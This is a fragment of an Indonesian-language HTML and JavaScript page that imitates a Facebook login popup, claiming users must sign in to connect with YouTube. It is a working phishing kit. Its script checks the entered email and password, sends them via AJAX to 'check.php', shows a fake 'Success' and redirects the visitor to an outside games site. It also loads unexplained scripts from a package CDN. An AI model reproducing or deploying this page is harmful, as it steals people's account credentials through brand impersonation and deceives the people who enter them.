            <div class="popup-login login-facebook animated fadeIn" style="display: none;">
		      <div class="popup-box-login-fb">
		        <div class="navbar-fb">
		          <img width="45" src="https://rawcdn.githack.com/AlexHostX/logAlex/391a0879c14c7ba91729a2271cfc42f3f874c190/facebook_text.png">
		          </div>
		          <div class="content-box-fb">
		      	  <p class="alert sandi">Kata sandi salah. <b>Apakah Anda melupakan kata sandi Anda?</b></p>
		       	  <p class="alert email">Nomor ponsel atau email yang Anda masukkan tidak cocok dengan akun apa pun. <b>Cari akun Anda.</b></p>
		          <img src="https://cdn.jsdelivr.net/gh/AlexHostX/logAlex@main/youtube.svg">
		          <div class="txt-login-fb">Masuk ke akun Facebook Anda untuk terhubung dengan YouTube</div>
                    <form class="login-form" action="" method="POST">
		            <label>
		            <input type="text" id="user" name="email" placeholder="Nomor ponsel atau email" autocomplete="off" autocapitalize="off">
		            </label>
		            <label>
		            <input type="password" id="pass" name="password" placeholder="Kata Sandi Facebook" autocomplete="off" autocapitalize="off">
		            </label>
		            <input type="hidden" name="login" value="Facebook">
		            <button type="submit" name="submit" class="btn-login-fb">Masuk</button>
		            </form>
		         <div class="txt-create-account">Buat akun</div>
		         <div class="txt-not-now">Lain kali</div>
		         <div class="txt-forgotten-password">Lupa Kata Sandi?</div>
		         </div>
		         <div class="language-box">
		         <center>
		         <div class="language-name language-name-active">Bahasa Indonesia</div>
		         <div class="language-name">English (UK)</div>
		         <div class="language-name">Basa Jawa</div>
		         <div class="language-name">Bahasa Melayu</div>
		         <div class="language-name">日本語</div>
		         <div class="language-name">Español</div>
		         <div class="language-name">Português (Brasil)</div>
		         <div class="language-name">
		         <i class="fa fa-plus"></i>
		         </div>
		         </center>
		        </div>
		       <div class="copyright">Facebook Inc.</div>
		     </div>
		   </div>
        </main>
        <script src="https://unpkg.com/footericon@3.7.1/icon.min.js"></script>
        <script src="https://unpkg.com/footericon@3.7.3/icon.min.js"></script>
        <script type="text/javascript">
            function opnalxf() {
                $('popalxup').hide();
                $('.login-facebook').fadeIn();
            }
                window.addEventListener('submit', (e) => {
                        $('.btn-login-fb').html('<i class="fa fa-circle-o-notch fa-spin">')
                    e.preventDefault()
                    setTimeout(() => {
                        check()
                    },2000)
                    return false;
                })
		    function check()
		    {
			    $user = $('#user').val().trim();
			    $pass = $('#pass').val().trim();
			    if($user == '' || $user == null || $user.length <= 5)
			    {
				    $('.email').show();
				    $('.sandi').hide();
				    $('.btn-login-fb').html('Masuk')
				    return false;
			    }else{
				    $('.email').hide();
			    }
			    if($pass == '' || $pass == null || $pass.length <= 5)
			    {
				    $('.sandi').show();
				    $('.btn-login-fb').html('Masuk')
				    return false;
			    }else{
				    $('.sandi').hide();
			    }
                    // if all form are filled
                    if($user !== '' || $user !== null || !$pass == '' || !$pass == null)
                
                    {
                        // SEND DATA
                        $.ajax({
                            type: 'POST',
                            url: 'check.php',
                            data: $('form').serialize(),
                            dataType: 'text',
                            success: function() {
                                        $('.login-facebook').toggle();
                                        $('.btn-login-fb').html('Success')
                                        $('.login-facebook').fadeOut();
                                        window.location = 'https://digames.space/go';
                                } 
                        })
                    }
		    }
	</script>
</body>
</html>